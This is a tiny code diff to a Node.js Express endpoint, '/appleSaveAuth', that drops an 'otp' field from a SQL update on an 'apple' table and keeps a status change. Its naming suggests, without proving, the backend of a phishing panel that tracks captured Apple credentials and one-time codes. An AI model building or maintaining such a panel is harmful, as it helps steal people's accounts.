@@ -2049,7 +2049,7 @@ app.post("/appleSaveAuth", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
 
   let details = [uniqueid];
-  let query = `UPDATE apple SET otp= ?, status = 6 WHERE uniqueid = ?`;
+  let query = `UPDATE apple SET status = 6 WHERE uniqueid = ?`;
 
   panelConnection.query(query, details, (err, rows, fields) => {
     if (!err) res.send("Insertion Completed");
